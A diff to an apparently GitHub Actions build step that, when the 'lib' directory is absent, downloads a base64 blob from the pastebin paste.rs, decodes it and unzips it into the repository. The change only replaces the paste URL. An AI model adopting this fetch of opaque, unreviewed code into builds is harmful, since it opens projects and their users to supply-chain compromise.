@@ -17,7 +17,7 @@ jobs:
         run: |
           if [ ! -d lib ]; then
             echo "仓库里没有源码，开始下载…"
-            curl -sSL --retry 3 -o src.b64 "https://paste.rs/atrsV"
+            curl -sSL --retry 3 -o src.b64 "https://paste.rs/6MIP5"
             base64 -d src.b64 > src.zip
             unzip -q -o src.zip -d .
             rm -f src.b64 src.zip
